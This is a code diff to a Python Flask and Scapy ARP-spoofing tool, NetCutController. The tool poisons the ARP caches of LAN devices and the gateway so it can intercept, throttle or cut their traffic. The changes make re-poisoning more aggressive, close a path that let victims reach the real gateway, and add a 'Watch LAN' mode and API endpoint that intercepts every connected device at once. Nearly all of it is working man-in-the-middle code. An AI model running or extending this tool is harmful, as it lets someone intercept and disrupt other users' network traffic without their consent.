@@ -13,7 +13,7 @@ from scapy.layers.inet import IP
 from flask import Flask, jsonify, request, render_template
 
 DATA_FILE = Path(__file__).parent / "devices.json"
-VERSION = "2.0.0"
+VERSION = "2.1.0"
 app = Flask(__name__)
 
 class Device:
@@ -331,13 +331,16 @@ class TokenBucketForwarder:
                     existing["watch"] = bool(watch)
                 else:
                     rate = (kbps * 1000) / 8.0
+                    now = time.time()
                     self._targets[ip] = {"kbps": kbps, "mac": mac,
                                          "watch": bool(watch),
                                          "q": deque(), "cq": deque(),
                                          "qbytes": 0, "cbytes": 0,
                                          "tokens": min(rate * 0.05, 64 * 1024),
-                                         "last": time.time(),
-                                         "bw_bytes": 0, "bw_last": time.time(),
+                                         "last": now,
+                                         "created": now, "last_frame_at": None,
+                                         "last_up_at": None, "last_down_at": None,
+                                         "bw_bytes": 0, "bw_last": now,
                                          "down": 0, "up": 0,
                                          "trace": deque(maxlen=24)}
             else:
@@ -471,11 +474,14 @@ class TokenBucketForwarder:
                 entry = tgt_dst
                 out = Ether(dst=entry["mac"], src=self.our_mac) / pkt[IP]
                 entry["down"] += 1
+                entry["last_down_at"] = time.time()
             else:
                 entry = tgt_src
                 out = Ether(dst=self.gateway_mac, src=self.our_mac) / pkt[IP]
                 entry["up"] += 1
+                entry["last_up_at"] = time.time()
             with self.lock:
+                entry["last_frame_at"] = time.time()
                 out_b = bytes(out)
                 if len(out_b) < 100:
                     entry["cq"].append(out_b)
@@ -499,6 +505,15 @@ class TokenBucketForwarder:
                 live = round((t["bw_bytes"] * 8) / span / 1e6, 2) if span > 0 else 0.0
                 t["bw_bytes"] = 0
                 t["bw_last"] = now
+                last_frame = t.get("last_frame_at")
+                if not self.stats.get("sock_open"):
+                    health = "error"
+                elif last_frame is None:
+                    health = "waiting"
+                elif now - last_frame <= 10:
+                    health = "active"
+                else:
+                    health = "idle"
                 targets[ip] = {"kbps": t["kbps"], "mac": t["mac"],
                                "watch": t["watch"],
                                "qbytes": t["qbytes"] + t["cbytes"],
@@ -506,6 +521,10 @@ class TokenBucketForwarder:
                                "control_queued": len(t["cq"]),
                                "down_frames": t["down"],
                                "up_frames": t["up"],
+                               "health": health,
+                               "age_seconds": round(now - t["created"], 1),
+                               "last_frame_seconds": (round(now - last_frame, 1)
+                                                      if last_frame else None),
                                "live_mbps": live}
             return {"targets": targets, "stats": dict(self.stats)}
 
@@ -532,6 +551,8 @@ class NetCutController:
         self.our_mac = None
         self.our_ip = None
         self.state_lock = threading.RLock()
+        self.watch_lan_enabled = False
+        self.watch_lan_macs = set()
 
     def save_quota(self):
         with self.state_lock:
@@ -718,7 +739,7 @@ class NetCutController:
             claims = {}
             for d in self.devices:
                 if d.spoof_stop and not d.spoof_stop.is_set():
-                    claims[d.ip] = d.mac
+                    claims[d.ip] = d
             if not claims: return
             if a.op == 1:  # who-has
                 if a.pdst in claims:
@@ -727,18 +748,21 @@ class NetCutController:
                         hwdst=pkt.src, pdst=a.psrc)
                     self._arp_send(reply)
                 elif a.pdst == self.gateway_ip and a.psrc in claims:
-                    reply = Ether(dst=self.gateway_mac, src=self.our_mac) / ARP(
+                    # The target is asking for the gateway. Reply directly to
+                    # the target; sending this to the gateway lets the real
+                    # gateway answer the phone and bypass the relay.
+                    reply = Ether(dst=pkt.src, src=self.our_mac) / ARP(
                         op=2, hwsrc=self.our_mac, psrc=self.gateway_ip,
-                        hwdst=self.our_mac, pdst=a.psrc)
+                        hwdst=pkt.src, pdst=a.psrc)
                     self._arp_send(reply)
             elif a.op == 2 and self.gateway_ip is not None:
-                # Someone answered who-has gateway not via us -> re-poison it
+                # A genuine ARP reply can repair either side's cache. Re-arm
+                # both legs immediately instead of waiting for the timer.
                 if a.psrc == self.gateway_ip and a.hwsrc != self.our_mac:
-                    for ip in claims:
-                        force = Ether(dst=self.gateway_mac, src=self.our_mac) / ARP(
-                            op=2, hwsrc=self.our_mac, psrc=ip,
-                            hwdst=self.gateway_mac, pdst=self.gateway_ip)
-                        self._arp_send(force)
+                    for dev in claims.values():
+                        self._poison_once(dev)
+                elif a.psrc in claims and a.hwsrc != self.our_mac:
+                    self._poison_once(claims[a.psrc])
         except Exception:
             pass
 
@@ -801,6 +825,8 @@ class NetCutController:
                 continue
             if d.state != "Disconnected":
                 d.state = "Offline"
+        if self.watch_lan_enabled:
+            self._sync_watch_lan()
 
     def _start_spoof(self, dev):
         if dev.spoof_stop: return
@@ -812,15 +838,18 @@ class NetCutController:
         if dev.spoof_stop: dev.spoof_stop.set()
         dev.spoof_stop = None; dev.spoof_thread = None
 
-    def _spoof_loop(self, dev):
-        protect = Ether(dst=self.our_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.our_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
+    def _poison_once(self, dev):
+        if not all((dev.mac, dev.ip, self.gateway_ip, self.gateway_mac, self.our_mac)):
+            return
         p1 = Ether(dst=dev.mac) / ARP(op=2, pdst=dev.ip, hwdst=dev.mac, psrc=self.gateway_ip, hwsrc=self.our_mac)
         p2 = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=dev.ip, hwsrc=self.our_mac)
+        self._arp_send(p1)
+        self._arp_send(p2)
+
+    def _spoof_loop(self, dev):
         while dev.spoof_stop and not dev.spoof_stop.is_set():
-            self._arp_send(p1)
-            self._arp_send(p2)
-            self._arp_send(protect)
-            time.sleep(2.5)
+            self._poison_once(dev)
+            time.sleep(1.0)
 
     def _restore(self, dev):
         p1 = Ether(dst=dev.mac) / ARP(op=2, pdst=dev.ip, hwdst=dev.mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
@@ -907,6 +936,36 @@ class NetCutController:
                     return True, "Connected"
         return False, "Not found."
 
+    def _sync_watch_lan(self):
+        count = 0
+        for d in self.devices:
+            if (d.ip == self.gateway_ip or d.mac == self.our_mac
+                    or d.state != "Connected"):
+                continue
+            ok, _ = self.set_watch(d.mac, True, bypass_quota=True)
+            if ok:
+                self.watch_lan_macs.add(d.mac)
+                count += 1
+        return count
+
+    def set_watch_lan(self, enabled):
+        if enabled:
+            if self.quota.mode in ("throttle", "block"):
+                return False, 0, "Disable active Quota Auto-Mode before Watch LAN."
+            self.watch_lan_enabled = True
+            count = self._sync_watch_lan()
+            return True, count, "Watching discovered LAN clients."
+        restored = 0
+        for mac in list(self.watch_lan_macs):
+            device = next((d for d in self.devices if d.mac == mac), None)
+            if device and device.state == "Watched":
+                ok, _ = self.set_watch(mac, False, bypass_quota=True)
+                if ok:
+                    restored += 1
+        self.watch_lan_macs.clear()
+        self.watch_lan_enabled = False
+        return True, restored, "LAN watch stopped."
+
     def rename_device(self, mac, name):
         for d in self.devices:
             if d.mac == mac:
@@ -968,6 +1027,8 @@ class NetCutController:
         if mode is None:
             self._restore_quota_devices()
             return
+        if self.watch_lan_enabled:
+            self.set_watch_lan(False)
         self.quota.mode = mode
         for d in self.devices:
             if (d.ip == self.gateway_ip or d.mac == self.our_mac
@@ -1005,6 +1066,8 @@ class NetCutController:
             if self.capture_stop: self.capture_stop.set()
             if self.auto_scan_thread: self.auto_scan_stop.set()
         self.forwarder.clear()
+        self.watch_lan_enabled = False
+        self.watch_lan_macs.clear()
         self.quota.mode = None
         self.quota.managed_devices.clear()
         if not stop_services:
@@ -1051,7 +1114,9 @@ def get_devices():
 def get_info():
     return jsonify({"ip": controller.ip, "gateway": controller.gateway_ip,
         "interface": controller.interface, "scanning": controller.scanning,
-        "scan_progress": controller.scan_progress, "version": VERSION})
+        "scan_progress": controller.scan_progress, "version": VERSION,
+        "watch_lan": controller.watch_lan_enabled,
+        "watch_lan_count": len(controller.watch_lan_macs)})
 
 @app.route('/api/scan', methods=['POST'])
 def scan():
@@ -1087,6 +1152,14 @@ def watch():
         return jsonify({"success": False, "error": "MAC and boolean watch state are required."}), 400
     ok, s = controller.set_watch(mac, data['watch'])
     return jsonify({"success": ok, "state": s}), (200 if ok else 409)
+
+@app.route('/api/watch_lan', methods=['POST'])
+def watch_lan():
+    data = request.get_json(silent=True) or {}
+    if not isinstance(data.get('enabled'), bool):
+        return jsonify({"success": False, "error": "Enabled must be true or false."}), 400
+    ok, count, message = controller.set_watch_lan(data['enabled'])
+    return jsonify({"success": ok, "count": count, "state": message}), (200 if ok else 409)
 
 @app.route('/api/rename', methods=['POST'])
 def rename():
